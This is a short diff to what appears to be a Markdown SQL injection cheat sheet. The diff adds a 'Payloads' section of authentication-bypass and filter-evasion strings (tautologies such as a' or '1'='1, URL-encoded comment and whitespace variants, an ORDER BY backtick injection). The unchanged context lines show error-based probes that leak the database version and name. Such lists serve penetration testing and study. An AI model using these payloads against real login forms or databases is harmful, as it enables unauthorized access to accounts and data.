@@ -24,7 +24,19 @@
     - ```id=1 and 1=@@version--```
     - ```id=1 and 1=db_name()--```
 
-
+## Payloads
+```
+a' or '1'='1
+a' or '1'='1'%23
+a' or 1=1%23
+a'%09or%09'1'='1
+a'or'1'='1
+a'/**/or/**/'1'='1
+2 or 1=1
+2%0Aor 1=1
+` desc %23
+IF(0,name,age)
+```
 
 ## Exploit
 - Login
